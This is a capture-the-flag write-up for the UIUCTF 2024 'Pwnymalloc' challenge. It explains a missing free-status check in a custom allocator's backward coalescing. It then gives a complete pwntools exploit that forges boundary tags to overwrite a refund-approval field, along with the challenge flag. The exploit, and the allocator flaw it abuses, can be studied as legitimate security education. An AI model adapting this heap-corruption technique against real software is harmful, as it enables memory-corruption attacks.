---
date: '2024-07-08T12:00:00Z'
draft: false
title: 'UIUCTF24 - Pwnymalloc'
summary: "Pwnymalloc is a nice custom allocator challenge from UIUCTF 2024. The vulnerability was about an incorrect handling of the prev_size during consolitation."

categories:
    - writeups
tags: 
    - "pwn"
    - "heap"
author: leo_something

ShowToc: true
---

## BINARY OVERVIEW

Pwnymalloc is a custom heap implementation library, the mechanics resemble the actual heap behaviors, but the code is really simple and short, so it must be pwnable! 

We are also provided with a binary that implements a "customer service portal" using Pwnymalloc library.

---
## BINARY REVERSE ENGINEERING

The binary allows a user to:

- Submit a complaint: allocate a chunk, write into it and free it (basically throws our opinion away, thank you!)
- Request a refund: allocate a chunk and write into it (this chunk has a REFUND_APPROVED bit set to 0, and we cannot change it)
- Check refund status: prints the flag if a refund gets somehow approved (REFUND_APPROVED == 1)

Our goal should be to break Pwnymalloc to somehow override the REFUND_APPROVED bit and get the flag, so let's read the library's source code.

---
## LIBRARY REVERSE ENGINEERING

My first hope was to be able to find the vulnerability without having to reverse all the code, which was not so short after all. But, guess what... I ended up reading and trying to understand the whole code :/ 

This took quite a bit of time, but being familiar with the glibc heap implementation it's easy to guess what these functions are doing.

Reading through the code we can identify the 2 most important functions: 

1. **`pwnymalloc(size)`**:
    - Initializes the heap if it’s the first allocation.
    - Aligns the requested size and searches for a fitting block.
    - If no suitable block is found, it extends the heap.
    - Optionally splits larger blocks to minimize waste.
    - Returns a pointer to the allocated memory.
    
2. **`pwnyfree(ptr)`**:
    - Validates the pointer and its alignment.
    - Marks the block as free and attempts to coalesce it with adjacent free blocks.
    - Inserts the coalesced block back into the free list.

A thing that caught my attention here was the "coalescence" feature: it sounded sketchy (and that turned out to be a really lucky guess).

```c
static chunk_ptr coalesce(chunk_ptr block) { 
	chunk_ptr prev_block = prev_chunk(block); 
	chunk_ptr next_block = next_chunk(block); 
	
	size_t size = get_size(block); 
	
	int prev_status = prev_block == NULL ? -1 : get_status(prev_block); 
	int next_status = next_block == NULL ? -1 : get_status(next_block); 
	
	if (prev_status == FREE && next_status == FREE) {
		// ...
}
```

The functions starts by getting the pointers to the previous and next chunk, but how is it done?

```c
static chunk_ptr prev_chunk(chunk_ptr block) {
    if ((void *) block - get_prev_size(block) < heap_start || 
	    get_prev_size(block) == 0) {
        
        return NULL;
    }

    return (chunk_ptr) ((char *) block - get_prev_size(block));
}
```

```c
static size_t get_prev_size(chunk_ptr block) {
    btag_t *prev_footer = (btag_t *) ((char *) block - BTAG_SIZE);
    return prev_footer->size;
}
```

Okay, so the `btag` is the size of a free chunk and it is located in the last WORD of it. Apparently this is used to calculate the pointer to the previous chunk during backward ~~consolidation~~ coalescence, but wait a moment, there is no check to confirm that the previous chunk is free!

We could basically allocate a chunk and write a fake `btag` in its last WORD, in this way if `coalesce` is triggered on the chunk after it `prev_chunk` would calcolate and return an arbitrary pointer!

---
## EXPLOITATION

At this point the exploitation path was really clear to me:
1. Allocate a chunk containing a fake chunk (it's pointer will be calculated by `prev_chunk` using a fake `btag`). 
2. Allocate another chunk and place a forged `btag` in its last WORD, calculating the right offset from the fake chunk.
3. Allocate a chunk and free it to trigger the `coalesce` mechanism and get the fake chunk into the "bin".
4. Finally allocate the fake chunk and override the REFUND_APPROVED bit and get the flag!

#### Problems I faced

Obviously the exploit didn't work first try, the main problems I faced are the following:
- the fake chunk must be aligned at 16 bytes,
- the fake chunk's `fd` and `bk` (pointers to next and previous free chunks) must be set to 0 to avoid further pain,
- the fake chunk must be set to FREE so the metadata must be calculated with the following formula: `size | status`.

#### Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chal")

context.binary = exe
context.terminal = ["alacritty", "-e"]

def conn():
    if args.GDB:
        r = gdb.debug([exe.path], gdbscript="b *pwnymalloc+210")
    elif args.REMOTE:
        r = remote("pwnymalloc.chal.uiuc.tf", 1337, ssl=True)
    else:
        r = process([exe.path])
    return r

r = conn()

def refund(amount, payload):
    r.sendlineafter(b">", b"3")
    r.sendlineafter(b":", str(amount).encode())
    r.sendafter(b":", payload)

def complaint(text): 
    r.sendlineafter(b">", b"1")
    r.sendlineafter(b":", text.encode())

def main():

    progress = log.progress("cooking")

    # build fake chunk
    fake_chunk_metadata = flat(0, 0xa0)
    payload = b"a"*0x28 + fake_chunk_metadata + b"\x00"*71
    refund(12, payload)

    # allocate a chunk with a forged btag
    btag = 0xe0
    payload = b"\x00"*0x78 + p32(btag) + b"\x00"*3
    refund(12, payload)

    # allocate and free
    complaint("hello")

    # override REFUND_APPROVED bit of complaint
    REFUND_APPROVED = 1
    payload = b"a"*0x40 + p64(0x91) + p32(REFUND_APPROVED) + p32(12) + b"\x00"*0x2f
    refund(12, payload)

    # check status to get the flag!
    r.sendlineafter(b">", b"4")
    r.sendlineafter(b":", b"1")

    progress.success()

    r.interactive()

if __name__ == "__main__":
    main()
```

**FLAG**: uiuctf{the_memory_train_went_off_the_tracks}

#### Post Scriptum 
I realized that if the first thing you do after running the binary is submitting a complaint the program would SIGSEGV. That's because `pwnyfree` always calls `coalesce` and in turn `coalesce` tries to get the previous chunk's `btag`. The thing is that the complaint is the first heap allocation, there is no previous chunk, so the program tries to get the contents of the WORD right before the start of the heap (which is not in mapped memory).

I learned a really good lesson here: **always try the binary before reading the code!**